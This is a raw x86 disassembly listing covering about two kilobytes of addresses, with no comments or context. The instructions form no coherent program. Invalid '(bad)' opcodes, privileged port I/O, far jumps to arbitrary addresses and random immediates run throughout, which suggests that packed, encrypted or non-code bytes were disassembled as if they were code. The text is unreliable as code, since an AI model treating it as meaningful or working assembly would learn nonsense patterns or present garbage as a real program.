  41d812:	add    edi,DWORD PTR [edi-0x3f]
  41d815:	sub    al,0xc8
  41d817:	add    DWORD PTR [ecx+0x7c58e001],0xefc32d32
  41d821:	adc    eax,0xe85a6849
  41d826:	rcr    BYTE PTR [ebp+0x41],0xb9
  41d82a:	sub    al,BYTE PTR [ebx-0x43]
  41d82d:	adc    dh,ah
  41d82f:	popa   
  41d830:	lods   eax,DWORD PTR ds:[esi]
  41d831:	sub    BYTE PTR [esi-0xfd6da31],bl
  41d837:	push   ss
  41d838:	mov    ds:0x6aa1ce54,eax
  41d83d:	(bad)  
  41d83e:	in     al,dx
  41d83f:	je     0x41d89f
  41d841:	jl     0x41d808
  41d843:	aaa    
  41d844:	and    ebx,edi
  41d846:	add    BYTE PTR [eax-0x4a],bh
  41d849:	shr    BYTE PTR ds:[ebp+0x1d573780],cl
  41d850:	cmp    esi,DWORD PTR [edi+0x43]
  41d853:	jbe    0x41d7e7
  41d855:	push   edx
  41d856:	push   ecx
  41d857:	or     ecx,DWORD PTR [eax-0x45871605]
  41d85d:	aas    
  41d85e:	call   0x601a8d43
  41d863:	rcr    BYTE PTR [ebx-0x1e],1
  41d866:	stos   DWORD PTR es:[edi],eax
  41d867:	jbe    0x41d837
  41d869:	sbb    dh,BYTE PTR [ebx-0x74]
  41d86c:	mov    cl,0x6f
  41d86e:	ja     0x41d8c8
  41d870:	xchg   esp,eax
  41d871:	in     al,dx
  41d872:	mov    ebp,?
  41d874:	ds mov eax,0x6c05aace
  41d87a:	pop    edi
  41d87b:	in     al,0xf1
  41d87d:	dec    esi
  41d87e:	std    
  41d87f:	cdq    
  41d880:	icebp  
  41d881:	or     al,0xd2
  41d883:	outs   dx,BYTE PTR ds:[esi]
  41d884:	es pop esp
  41d886:	mov    ah,0xc9
  41d888:	xchg   esp,eax
  41d889:	sbb    esi,DWORD PTR ds:0x35d7a227
  41d88f:	xor    DWORD PTR [ebx],esp
  41d891:	ror    BYTE PTR [ecx],1
  41d893:	xchg   esi,eax
  41d894:	icebp  
  41d895:	jle    0x41d8aa
  41d897:	xchg   ebp,eax
  41d898:	cmp    bh,BYTE PTR [edx+0x63]
  41d89b:	dec    ebx
  41d89c:	sbb    al,0x44
  41d89e:	xchg   ebp,eax
  41d89f:	mov    ecx,DWORD PTR [esi]
  41d8a1:	xchg   edx,eax
  41d8a2:	fcompp 
  41d8a4:	cmp    esp,DWORD PTR [ecx+0x189b549d]
  41d8aa:	ret    0xa587
  41d8ad:	mov    esi,0x4c7fba88
  41d8b2:	ficom  WORD PTR gs:[ecx+0x6c]
  41d8b6:	mov    ebp,0xb9d41885
  41d8bb:	call   0x5081f4d6
  41d8c0:	jnp    0x41d8b8
  41d8c2:	cld    
  41d8c3:	lods   eax,DWORD PTR ds:[esi]
  41d8c4:	push   edi
  41d8c5:	daa    
  41d8c6:	rcl    BYTE PTR [edi],1
  41d8c8:	inc    ebp
  41d8c9:	adc    BYTE PTR [esi+0x4f],0x1e
  41d8cd:	adc    eax,0xd9e07985
  41d8d2:	ins    DWORD PTR es:[edi],dx
  41d8d3:	pop    edi
  41d8d4:	or     esp,DWORD PTR [eax-0x1d]
  41d8d7:	outs   dx,BYTE PTR ds:[esi]
  41d8d8:	push   eax
  41d8d9:	jo     0x41d8dc
  41d8db:	out    0x75,eax
  41d8dd:	fwait
  41d8de:	jae    0x41d871
  41d8e0:	push   cs
  41d8e1:	imul   ebp,DWORD PTR [ebx+0x33],0x20b1ac60
  41d8e8:	mov    ch,0x8f
  41d8ea:	mov    cl,0x67
  41d8ec:	stc    
  41d8ed:	aas    
  41d8ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8ef:	sub    DWORD PTR ds:0xa5947e3d,ebx
  41d8f5:	mov    dh,0xeb
  41d8f7:	pusha  
  41d8f8:	scas   eax,DWORD PTR es:[edi]
  41d8f9:	div    DWORD PTR [esi+0x57f3f2ea]
  41d8ff:	bound  eax,QWORD PTR [edx]
  41d901:	xlat   BYTE PTR ds:[ebx]
  41d902:	lds    ecx,FWORD PTR [eax-0x4774168d]
  41d908:	push   edi
  41d909:	jmp    0xd19de22d
  41d90e:	sbb    esi,ecx
  41d910:	mov    ebp,0xa5dfe6b9
  41d915:	mov    esp,0x9131cb75
  41d91a:	push   cs
  41d91b:	lock jae 0x41d934
  41d91e:	add    esi,ebp
  41d920:	pop    edx
  41d921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d922:	jge    0x41d8c7
  41d924:	add    BYTE PTR [ecx],ah
  41d926:	lods   al,BYTE PTR ds:[esi]
  41d927:	push   ebx
  41d928:	inc    ecx
  41d929:	cmp    cl,BYTE PTR [eax-0x4d]
  41d92c:	add    DWORD PTR [ecx+edx*1-0x2d],ebp
  41d930:	dec    esp
  41d931:	mov    DWORD PTR [esi+esi*4+0x3b],edx
  41d935:	sbb    DWORD PTR [eax],edi
  41d937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d938:	dec    ebx
  41d939:	fldcw  WORD PTR [ebx]
  41d93b:	jp     0x41d90a
  41d93d:	enter  0xb7db,0x94
  41d941:	aad    0x32
  41d943:	dec    ecx
  41d944:	add    bh,BYTE PTR gs:[ecx+0x31]
  41d948:	(bad)  
  41d949:	push   cs
  41d94a:	sub    BYTE PTR [ebx],bh
  41d94c:	jno    0x41d9cb
  41d94e:	hlt    
  41d94f:	(bad)  
  41d950:	dec    ecx
  41d951:	pop    ds
  41d952:	jmp    0x41d9a6
  41d954:	sqrtps xmm2,XMMWORD PTR [eax-0x5a6afd5c]
  41d95b:	sbb    DWORD PTR [eax+eax*1],esp
  41d95e:	mov    eax,0x4440d8a
  41d963:	pop    edx
  41d964:	xor    eax,0xc20db2d2
  41d969:	call   0xf7d3:0xc06a8630
  41d970:	sub    esi,DWORD PTR [edx+0x68830e8e]
  41d976:	sub    BYTE PTR [edi],dl
  41d978:	push   eax
  41d979:	jnp    0x41d982
  41d97b:	jo     0x41d9c2
  41d97d:	or     ebp,DWORD PTR [ecx+0xbe48628]
  41d983:	dec    ebx
  41d984:	inc    esi
  41d985:	and    al,0xc2
  41d987:	jge    0x41d964
  41d989:	rol    edx,1
  41d98b:	jae    0x41da00
  41d98d:	xor    DWORD PTR ds:0x6bbdc5cf,edx
  41d993:	jbe    0x41d9f4
  41d995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d996:	jmp    0x41d99e
  41d998:	or     dl,BYTE PTR [eax-0x29]
  41d99b:	leave  
  41d99c:	adc    BYTE PTR [ecx],cl
  41d99e:	fadd   st(7),st
  41d9a0:	mov    edx,0xcb479364
  41d9a5:	xchg   ecx,eax
  41d9a6:	(bad)  
  41d9a8:	jo     0x41d99f
  41d9aa:	lds    ebx,FWORD PTR ds:0xa5f05fa5
  41d9b0:	xor    esp,DWORD PTR [ecx-0x78]
  41d9b3:	dec    edx
  41d9b4:	jmp    DWORD PTR [ebp+0x145f9dfa]
  41d9ba:	scas   al,BYTE PTR es:[edi]
  41d9bb:	inc    edi
  41d9bc:	in     eax,dx
  41d9bd:	mov    ah,0xb6
  41d9bf:	les    edi,FWORD PTR [edi-0x27105294]
  41d9c5:	dec    ebx
  41d9c6:	(bad)  
  41d9c7:	mov    BYTE PTR ds:0xbe62019d,dh
  41d9cd:	and    eax,0xec496281
  41d9d2:	or     edx,ecx
  41d9d4:	(bad)  
  41d9d5:	adc    al,0xee
  41d9d7:	pop    eax
  41d9d8:	xor    eax,0x67513f2e
  41d9dd:	shr    DWORD PTR [esp+edi*8+0x3df8cb6e],0x2f
  41d9e5:	jmp    0xc073505c
  41d9ea:	bound  esp,QWORD PTR [ecx-0x28]
  41d9ed:	or     al,0xa6
  41d9ef:	bswap  ebx
  41d9f1:	push   ebx
  41d9f2:	stos   BYTE PTR es:[edi],al
  41d9f3:	cmp    bl,0xc3
  41d9f6:	or     edx,DWORD PTR [edi]
  41d9f8:	adc    al,0xbc
  41d9fa:	clc    
  41d9fb:	adc    ebx,eax
  41d9fd:	sbb    edi,0xe5fc0f3c
  41da03:	pop    ebp
  41da04:	push   cs
  41da05:	pop    ebp
  41da06:	pop    ds
  41da07:	push   ebp
  41da08:	sbb    ch,BYTE PTR [edi]
  41da0a:	out    0x88,al
  41da0c:	clc    
  41da0d:	sbb    eax,DWORD PTR [edx]
  41da0f:	cmp    al,0x63
  41da11:	sahf   
  41da12:	aad    0xac
  41da14:	jbe    0x41da39
  41da16:	popa   
  41da17:	or     al,0x71
  41da19:	mov    bl,0x8d
  41da1b:	sbb    eax,0x11
  41da1e:	mov    bl,0x89
  41da20:	or     eax,0x96f9458e
  41da25:	pop    es
  41da26:	and    dl,BYTE PTR [edi]
  41da28:	and    BYTE PTR [ecx+0x59],0xa3
  41da2c:	test   DWORD PTR [edx],ebx
  41da2e:	mov    DWORD PTR [esi-0x3c],esp
  41da31:	mov    ah,0xb2
  41da33:	aad    0x68
  41da35:	test   bl,ch
  41da37:	lods   eax,DWORD PTR fs:[esi]
  41da39:	(bad)  
  41da3b:	imul   eax,DWORD PTR [esi-0x1c4ab8cb],0x2a2ea4f9
  41da45:	aam    0x87
  41da47:	mov    al,0xe6
  41da49:	inc    eax
  41da4a:	pop    ebp
  41da4b:	inc    ecx
  41da4c:	or     dh,BYTE PTR [ebp-0x29]
  41da4f:	test   al,0xc5
  41da51:	(bad)  
  41da53:	(bad)  
  41da54:	sahf   
  41da55:	pop    edx
  41da56:	push   es
  41da57:	adc    BYTE PTR [edi+0x15],ch
  41da5a:	out    dx,eax
  41da5b:	add    DWORD PTR [ecx-0x4d],eax
  41da5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da5f:	outs   dx,DWORD PTR ds:[esi]
  41da60:	and    bh,ch
  41da62:	and    eax,0x4ecae869
  41da67:	push   cs
  41da68:	pop    es
  41da69:	nop
  41da6a:	mov    ecx,0xe79d5779
  41da6f:	rcr    DWORD PTR [ecx-0x7561e880],0x42
  41da76:	xchg   BYTE PTR [edi],ah
  41da78:	pop    ds
  41da79:	xor    DWORD PTR [ecx],edx
  41da7b:	jo     0x41da19
  41da7d:	jns    0x41da13
  41da7f:	sub    al,0x10
  41da81:	repnz cmp al,ch
  41da84:	add    al,0xac
  41da86:	dec    ebx
  41da87:	jno    0x41da2e
  41da89:	retf   
  41da8a:	hlt    
  41da8b:	add    ch,ch
  41da8d:	lahf   
  41da8e:	addr16 mov ch,0x6a
  41da91:	xchg   edi,eax
  41da92:	ja     0x41da7d
  41da94:	fs push ecx
  41da96:	push   eax
  41da97:	leave  
  41da98:	outs   dx,DWORD PTR ds:[esi]
  41da99:	mov    bl,0x7b
  41da9b:	push   edi
  41da9c:	xchg   BYTE PTR [edi-0x58],bh
  41da9f:	push   ecx
  41daa0:	leave  
  41daa1:	out    0xc1,al
  41daa3:	jecxz  0x41dacd
  41daa5:	or     DWORD PTR [ebx+0x3e],esp
  41daa8:	sub    eax,0x96823a7e
  41daad:	out    dx,al
  41daae:	test   BYTE PTR [ecx-0x4c],dh
  41dab1:	or     bh,ah
  41dab3:	sbb    al,0xa2
  41dab5:	rcl    DWORD PTR [ecx+0x78fc8f44],cl
  41dabb:	icebp  
  41dabc:	fs popa 
  41dabe:	or     eax,0xf5a836f1
  41dac3:	mov    al,0xad
  41dac5:	test   cl,0xea
  41dac8:	and    BYTE PTR [edx-0x7],bh
  41dacb:	inc    eax
  41dacc:	push   edi
  41dacd:	sbb    ah,BYTE PTR [eax-0x463e087c]
  41dad3:	dec    esp
  41dad4:	add    ebx,DWORD PTR ds:0xc98772ca
  41dada:	mov    edi,0x1613dc8a
  41dadf:	xchg   esp,eax
  41dae0:	fisttp WORD PTR [ebp-0x23]
  41dae3:	or     eax,esp
  41dae5:	jge    0x41db49
  41dae7:	xor    DWORD PTR [edx+0x3b46a7d6],esi
  41daed:	add    ch,BYTE PTR [eax]
  41daef:	inc    esi
  41daf0:	imul   ebp,DWORD PTR [edi+0x4a899a8e],0x22
  41daf7:	(bad)  
  41daf8:	adc    eax,0xb57aae2b
  41dafd:	mov    ebx,0x1b829da
  41db02:	cmc    
  41db03:	mov    eax,DWORD PTR [ebx+0x6e]
  41db06:	sub    dl,dl
  41db08:	ins    DWORD PTR es:[edi],dx
  41db09:	add    eax,0x28f1b41c
  41db0e:	pop    es
  41db0f:	sub    esp,DWORD PTR [esi+ebx*8+0x16c030a1]
  41db16:	jnp    0x41db48
  41db18:	push   es
  41db19:	jmp    0x41db0f
  41db1b:	bound  edi,QWORD PTR [eax+0x63]
  41db1e:	int3   
  41db1f:	pop    ecx
  41db20:	mov    bh,0x93
  41db22:	mov    dh,0xce
  41db24:	mov    DWORD PTR [edx],eax
  41db26:	mov    ah,0x90
  41db28:	mov    bh,0x89
  41db2a:	jbe    0x41daf8
  41db2c:	inc    ebx
  41db2d:	push   esi
  41db2e:	mov    BYTE PTR [ebx-0x7315fd1],dl
  41db34:	test   bl,cl
  41db36:	xchg   edi,eax
  41db37:	push   cs
  41db38:	cmp    BYTE PTR [ebx],0xee
  41db3b:	outs   dx,BYTE PTR ds:[esi]
  41db3c:	ret    0xe16a
  41db3f:	cld    
  41db40:	mov    DWORD PTR [ebx+0x5f],edx
  41db43:	in     al,dx
  41db44:	stos   DWORD PTR es:[edi],eax
  41db45:	retf   0x50be
  41db48:	add    al,0xee
  41db4a:	dec    esi
  41db4b:	and    DWORD PTR [esp+edx*2],esp
  41db4e:	cmp    ch,BYTE PTR [esi+0x7e]
  41db51:	scas   al,BYTE PTR es:[edi]
  41db52:	shl    DWORD PTR [edi],cl
  41db54:	jnp    0x41db16
  41db56:	sbb    BYTE PTR [ebp+0x2f85625b],ch
  41db5c:	sbb    BYTE PTR [ebx],al
  41db5e:	mov    dh,0xb5
  41db60:	inc    ecx
  41db61:	xchg   ecx,eax
  41db62:	out    dx,eax
  41db63:	mov    eax,ds:0x40288ca6
  41db68:	test   BYTE PTR [edx+0x7f],bh
  41db6b:	fisub  DWORD PTR [edx+edi*1]
  41db6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db6f:	sti    
  41db70:	xlat   BYTE PTR ds:[ebx]
  41db71:	out    0xe2,al
  41db73:	lods   eax,DWORD PTR ds:[esi]
  41db74:	int3   
  41db75:	ins    DWORD PTR es:[edi],dx
  41db76:	push   edx
  41db77:	pop    ecx
  41db78:	xchg   ecx,eax
  41db79:	outs   dx,DWORD PTR ds:[esi]
  41db7a:	sub    DWORD PTR [eax-0x17055ec0],eax
  41db80:	and    BYTE PTR [esi-0x721d7988],0x83
  41db87:	jnp    0x41db5e
  41db89:	cmp    al,0xd
  41db8b:	dec    edx
  41db8c:	adc    ch,al
  41db8e:	lock or BYTE PTR [edx],0x62
  41db92:	mov    eax,0x7a6d45db
  41db97:	retf   0x8b7b
  41db9a:	pushf  
  41db9b:	sub    DWORD PTR [ebp+eax*1-0x309f4c30],ecx
  41dba2:	cmp    BYTE PTR [esi+0x2e],dl
  41dba5:	fstp   DWORD PTR [edi+0x1c]
  41dba8:	mov    eax,0xe475aff8
  41dbad:	or     ah,0xd5
  41dbb0:	mov    al,ds:0x94fb9d37
  41dbb5:	mov    esp,DWORD PTR [edi+ebx*8-0x4b430b90]
  41dbbc:	jns    0x41db70
  41dbbe:	push   ds
  41dbbf:	fadd   QWORD PTR [ebx+0x1600e47d]
  41dbc5:	mov    bh,0xf9
  41dbc7:	push   edi
  41dbc8:	pop    ss
  41dbc9:	mov    ds:0x59b26201,al
  41dbce:	fidiv  WORD PTR [eax+edi*2-0x50]
  41dbd2:	test   eax,0x940b72fe
  41dbd7:	jp     0x41dba5
  41dbd9:	mov    dl,0x76
  41dbdb:	and    al,0x53
  41dbdd:	mov    BYTE PTR [edx-0x396ee467],ch
  41dbe3:	stos   DWORD PTR es:[edi],eax
  41dbe4:	aas    
  41dbe5:	pop    ds
  41dbe6:	fidiv  DWORD PTR [edx-0x6f]
  41dbe9:	sub    ebp,0x6f
  41dbec:	adc    DWORD PTR [ecx-0x5d8fbe1b],0x711bcc2b
  41dbf6:	fbld   TBYTE PTR [edi+0xb6a359e]
  41dbfc:	pop    ebx
  41dbfd:	mov    ebp,DWORD PTR [esi]
  41dbff:	adc    DWORD PTR [ebx],esp
  41dc01:	xchg   DWORD PTR [edx],esp
  41dc03:	adc    esp,DWORD PTR [eax+0x47]
  41dc06:	dec    ebp
  41dc07:	push   ecx
  41dc08:	push   edx
  41dc09:	mov    esi,0x25ffdcf6
  41dc0e:	mov    dh,BYTE PTR [eax]
  41dc10:	mov    ah,0xe2
  41dc12:	shl    DWORD PTR [ecx-0x20],1
  41dc15:	mov    edi,edx
  41dc17:	xlat   BYTE PTR ds:[ebx]
  41dc18:	aaa    
  41dc19:	aad    0xc1
  41dc1b:	xor    ah,cl
  41dc1d:	cmp    al,0x47
  41dc1f:	inc    edi
  41dc20:	mov    esi,0xded8e934
  41dc25:	pop    ebp
  41dc26:	lock in eax,dx
  41dc28:	sbb    al,0x4d
  41dc2a:	sub    DWORD PTR [ecx-0x47],edx
  41dc2d:	icebp  
  41dc2e:	popa   
  41dc2f:	jecxz  0x41dbb8
  41dc31:	mov    bh,0xd4
  41dc33:	mov    eax,0xdb4fb13b
  41dc38:	ret    0x67da
  41dc3b:	dec    eax
  41dc3c:	fsubr  QWORD PTR [ecx]
  41dc3e:	mov    ebp,eax
  41dc40:	mov    ch,0x98
  41dc42:	mov    ds:0x76368890,al
  41dc47:	lds    esp,FWORD PTR [edx]
  41dc49:	adc    DWORD PTR [ebx-0x761e56a8],ecx
  41dc4f:	xor    bh,bl
  41dc51:	adc    esi,ebx
  41dc53:	push   esp
  41dc54:	lods   eax,DWORD PTR ds:[esi]
  41dc55:	jg     0x41dcac
  41dc57:	sar    BYTE PTR [edi+ebx*4-0x41],0x9d
  41dc5c:	mov    edx,0xb0efeaf6
  41dc61:	dec    edi
  41dc62:	ds cmp ecx,0xa7f5bb81
  41dc69:	cmp    eax,0x849b4948
  41dc6e:	pop    ds
  41dc6f:	mov    ebx,0xd4873409
  41dc74:	xchg   ebp,eax
  41dc75:	fs jge 0x41dc33
  41dc78:	dec    ebx
  41dc79:	lea    esp,[edx+0x2da20257]
  41dc7f:	lods   al,BYTE PTR ds:[esi]
  41dc80:	aaa    
  41dc81:	adc    dh,BYTE PTR [ebp+ebx*2-0x7d]
  41dc85:	mov    edi,0xe7a21d55
  41dc8a:	loop   0x41dc5e
  41dc8c:	mov    ah,0xc6
  41dc8e:	pusha  
  41dc8f:	fstp   QWORD PTR ds:0x39a21c47
  41dc95:	lea    edi,[eax-0x49971c54]
  41dc9b:	and    dl,BYTE PTR [eax]
  41dc9d:	jns    0x41dc57
  41dc9f:	pop    es
  41dca0:	mov    edx,0x43a370b0
  41dca5:	push   0x5905872f
  41dcaa:	fiadd  WORD PTR [ebx]
  41dcac:	fcmovnb st,st(3)
  41dcae:	or     al,0x99
  41dcb0:	or     BYTE PTR [ebx+edx*1-0x58],ah
  41dcb4:	mov    esi,0x8162e910
  41dcb9:	ins    BYTE PTR es:[edi],dx
  41dcba:	jno    0x41dcb9
  41dcbc:	cli    
  41dcbd:	pop    esi
  41dcbe:	pushf  
  41dcbf:	dec    edx
  41dcc0:	lea    eax,[edi+edi*2-0x7b002a35]
  41dcc7:	loopne 0x41dc93
  41dcc9:	sub    al,0x52
  41dccb:	inc    esp
  41dccc:	das    
  41dccd:	push   0x6d
  41dccf:	pop    edx
  41dcd0:	or     ebx,0x55749163
  41dcd6:	pushf  
  41dcd7:	jo     0x41dc5f
  41dcd9:	hlt    
  41dcda:	xor    BYTE PTR [ecx+eiz*8-0x4d],dh
  41dcde:	xchg   ecx,eax
  41dcdf:	scas   al,BYTE PTR es:[edi]
  41dce0:	cdq    
  41dce1:	hlt    
  41dce2:	and    BYTE PTR [ecx-0x72],bh
  41dce5:	pop    esi
  41dce6:	mov    dl,BYTE PTR [eax]
  41dce8:	mov    al,ds:0xfb92e5c0
  41dced:	mov    ebp,0x892a515b
  41dcf2:	jmp    0x3f45c821
  41dcf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcf8:	les    eax,FWORD PTR [ecx-0x25]
  41dcfb:	fist   WORD PTR [eax-0x54]
  41dcfe:	jle    0x41dd75
  41dd00:	stc    
  41dd01:	xchg   ecx,eax
  41dd02:	jp     0x41dd36
  41dd04:	sbb    al,0xf7
  41dd06:	lock push esi
  41dd08:	gs add al,cl
  41dd0b:	inc    edx
  41dd0c:	icebp  
  41dd0d:	jmp    0x6a3c:0x2610d4cb
  41dd14:	add    ecx,esi
  41dd16:	ds xchg esp,eax
  41dd18:	jecxz  0x41dd65
  41dd1a:	aaa    
  41dd1b:	call   ecx
  41dd1d:	(bad)  
  41dd1e:	call   DWORD PTR [ebx+edx*4-0x55e0af40]
  41dd25:	(bad)  [ebp+0x76]
  41dd28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd29:	test   eax,0x8ba834da
  41dd2e:	xor    BYTE PTR [ebp-0x5322f53f],bl
  41dd34:	imul   ebx,DWORD PTR [ecx+0x62daaa65],0x50
  41dd3b:	sbb    BYTE PTR [esi+0x5eb48856],al
  41dd41:	pop    esi
  41dd42:	adc    BYTE PTR [ecx],ah
  41dd44:	sbb    BYTE PTR [ebx+0x1af0ef39],0xf5
  41dd4b:	int3   
  41dd4c:	dec    eax
  41dd4d:	pop    edi
  41dd4e:	sbb    dh,BYTE PTR [esi+0x11]
  41dd51:	ret    0xd5c1
  41dd54:	and    esp,DWORD PTR [ebp+ebp*8+0x46f253fe]
  41dd5b:	adc    ecx,edx
  41dd5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd5e:	mov    DWORD PTR [ebx+0x73],edi
  41dd61:	scas   eax,DWORD PTR es:[edi]
  41dd62:	sub    BYTE PTR [esi+eax*2+0x16ccfa6],dh
  41dd69:	xchg   esi,eax
  41dd6a:	xor    ah,BYTE PTR [edx]
  41dd6c:	and    DWORD PTR [ebx-0x41],ebp
  41dd6f:	(bad)  
  41dd70:	faddp  st(1),st
  41dd72:	mov    ds:0xe902cc66,al
  41dd77:	pop    esp
  41dd78:	stos   BYTE PTR es:[edi],al
  41dd79:	not    DWORD PTR [eax+0x36]
  41dd7c:	pop    ebp
  41dd7d:	dec    eax
  41dd7e:	xor    BYTE PTR [edx],dl
  41dd80:	iret   
  41dd81:	adc    BYTE PTR [edx],dl
  41dd83:	in     eax,dx
  41dd84:	in     eax,dx
  41dd85:	mov    es,WORD PTR [eax]
  41dd87:	push   es
  41dd88:	test   al,0xbe
  41dd8a:	mov    BYTE PTR [edx+0x68],ch
  41dd8d:	jg     0x41dd90
  41dd8f:	jmp    0x1650a8c4
  41dd94:	or     DWORD PTR [ecx],ebx
  41dd96:	ret    0x4f99
  41dd99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd9a:	je     0x41dd42
  41dd9c:	add    eax,0x7da75e2f
  41dda1:	les    ebp,FWORD PTR [edx+0x4cf59061]
  41dda7:	mov    edi,0x651f6df9
  41ddac:	fidiv  WORD PTR [ebx+esi*2-0x42f508a2]
  41ddb3:	xchg   esi,eax
  41ddb4:	out    0x9b,al
  41ddb6:	fisub  DWORD PTR [edx-0x5f]
  41ddb9:	sbb    eax,0xcdb8db97
  41ddbe:	mov    gs,esp
  41ddc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddc1:	jnp    0x41dda4
  41ddc3:	sar    DWORD PTR [ebx-0x1],0x40
  41ddc7:	pop    es
  41ddc8:	loopne 0x41dda1
  41ddca:	jno    0x41dd9a
  41ddcc:	or     eax,0x22ee6952
  41ddd1:	(bad)  [edi+0x79]
  41ddd4:	mov    esi,0x58ac9f0e
  41ddd9:	jl     0x41ddc0
  41dddb:	and    dh,ah
  41dddd:	hlt    
  41ddde:	push   ds
  41dddf:	push   edx
  41dde0:	inc    esi
  41dde1:	(bad)  
  41dde2:	gs int3 
  41dde4:	cli    
  41dde5:	mov    dh,0x5e
  41dde7:	loop   0x41dde9
  41dde9:	mul    ecx
  41ddeb:	jne    0x41de25
  41dded:	push   ss
  41ddee:	cmp    eax,0x7df77ec
  41ddf3:	aam    0xa0
  41ddf5:	cwde   
  41ddf6:	icebp  
  41ddf7:	pop    ebx
  41ddf8:	out    0x21,eax
  41ddfa:	test   eax,0xe3a56cc5
  41ddff:	inc    ecx
  41de00:	mov    cl,0x10
  41de02:	pop    eax
  41de03:	retf   0x1a15
  41de06:	repz xor BYTE PTR [eax+0x1eee887d],0x9a
  41de0e:	inc    ebp
  41de0f:	push   es
  41de10:	aas    
  41de11:	in     al,0xb5
  41de13:	ret    
  41de14:	loope  0x41de5c
  41de16:	lods   al,BYTE PTR ds:[esi]
  41de17:	and    al,al
  41de19:	push   ds
  41de1a:	xchg   edi,eax
  41de1b:	pop    edx
  41de1c:	adc    DWORD PTR [eax+ebx*4-0x4c],esi
  41de20:	mul    DWORD PTR [edx+0x5]
  41de23:	sub    dl,BYTE PTR fs:[ecx]
  41de26:	call   0x9507:0xbe2592c2
  41de2d:	lods   eax,DWORD PTR ds:[esi]
  41de2e:	enter  0xdc47,0xaa
  41de32:	out    dx,al
  41de33:	(bad)  
  41de34:	loopne 0x41de9b
  41de36:	outs   dx,DWORD PTR ds:[esi]
  41de37:	push   ss
  41de38:	cmp    edi,ebp
  41de3a:	pop    ebp
  41de3b:	pop    es
  41de3c:	dec    eax
  41de3d:	push   ecx
  41de3e:	sbb    ecx,DWORD PTR [ecx]
  41de40:	icebp  
  41de41:	sti    
  41de42:	pop    edx
  41de43:	fbstp  TBYTE PTR [ecx+0xe]
  41de46:	fisttp QWORD PTR [ebp+esi*1+0x2f403dfe]
  41de4d:	neg    BYTE PTR [ebx+0x67]
  41de50:	xchg   ebx,eax
  41de51:	loop   0x41de3e
  41de53:	push   es
  41de54:	rol    DWORD PTR [ebp-0x4c984e79],0x59
  41de5b:	or     cl,BYTE PTR [eax]
  41de5d:	mov    ds:0xea099b8,eax
  41de62:	call   0xb7f202e7
  41de67:	or     BYTE PTR [ebx-0x4e0cffff],0xb9
  41de6e:	nop
  41de6f:	push   0xb1a953d4
  41de74:	retf   
  41de75:	jp     0x41de8f
  41de77:	(bad)  
  41de78:	fxch   st(6)
  41de7a:	out    dx,eax
  41de7b:	mov    WORD PTR [ecx+0x3b],ss
  41de7e:	xchg   bh,al
  41de80:	mov    dh,BYTE PTR [esi-0x2c707d02]
  41de86:	shr    ecx,1
  41de88:	mov    ?,WORD PTR [ecx-0x4d]
  41de8b:	jno    0x41de26
  41de8d:	idiv   DWORD PTR [edx-0x78]
  41de90:	jl     0x41de60
  41de92:	or     dh,ch
  41de94:	call   0xa772:0xb9f8b258
  41de9b:	stos   BYTE PTR es:[edi],al
  41de9c:	pop    ebp
  41de9d:	cdq    
  41de9e:	(bad)  
  41dea0:	lds    ebx,FWORD PTR [eax]
  41dea2:	pusha  
  41dea3:	(bad)  
  41dea4:	mov    cl,0x67
  41dea6:	aad    0x75
  41dea8:	or     DWORD PTR [edi-0x9],ecx
  41deab:	lahf   
  41deac:	xor    ecx,DWORD PTR [ebp+0x3b]
  41deaf:	inc    ebp
  41deb0:	xchg   edx,eax
  41deb1:	and    DWORD PTR [ebx],esi
  41deb3:	imul   eax,DWORD PTR [ecx+0x396012a0],0xffffffe9
  41deba:	inc    ecx
  41debb:	fisttp QWORD PTR [eax+0x3c]
  41debe:	pushf  
  41debf:	loopne 0x41deb2
  41dec1:	sub    eax,0x427666db
  41dec6:	mov    bh,0x64
  41dec8:	call   0x607b5d16
  41decd:	(bad)  
  41dece:	cmp    esp,DWORD PTR ds:0xb2a5c649
  41ded4:	imul   edi,eax,0xcebc563b
  41deda:	inc    edx
  41dedb:	mov    ecx,0x749b17d6
  41dee0:	hlt    
  41dee1:	and    DWORD PTR [esi-0x52b2ed29],ebp
  41dee7:	test   eax,0x8088c2f7
  41deec:	outs   dx,BYTE PTR ds:[esi]
  41deed:	cmp    eax,0xc0649d8
  41def2:	mov    bl,0x88
  41def4:	retf   0x126a
  41def7:	push   es
  41def8:	jecxz  0x41df1f
  41defa:	stos   DWORD PTR es:[edi],eax
  41defb:	loopne 0x41de80
  41defd:	ret    0x98e8
  41df00:	iret   
  41df01:	scas   eax,DWORD PTR es:[edi]
  41df02:	jmp    0x5266cba1
  41df07:	mov    fs,WORD PTR [ebx-0x5b]
  41df0a:	ss jp  0x41ded9
  41df0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df0e:	pop    ds
  41df0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df10:	xlat   BYTE PTR ds:[ebx]
  41df11:	jno    0x41df6e
  41df13:	mov    eax,ds:0x87e96267
  41df18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df19:	aaa    
  41df1a:	pop    esp
  41df1b:	aaa    
  41df1c:	pop    ecx
  41df1d:	pop    edx
  41df1e:	rol    BYTE PTR [edx],cl
  41df20:	addr16 int 0x1b
  41df23:	jo     0x41df66
  41df25:	popf   
  41df26:	xlat   BYTE PTR ds:[ebx]
  41df27:	daa    
  41df28:	fisubr WORD PTR [edi+0x25]
  41df2b:	lods   al,BYTE PTR ds:[esi]
  41df2c:	and    BYTE PTR [eax],dl
  41df2e:	scas   eax,DWORD PTR es:[edi]
  41df2f:	xor    ebx,0x29
  41df32:	ins    DWORD PTR es:[edi],dx
  41df33:	imul   BYTE PTR [ebx+0xb2ca369]
  41df39:	ds cmp eax,0xc453607
  41df3f:	and    al,0x7c
  41df41:	cmc    
  41df42:	lods   eax,DWORD PTR ds:[esi]
  41df43:	ret    0x83ef
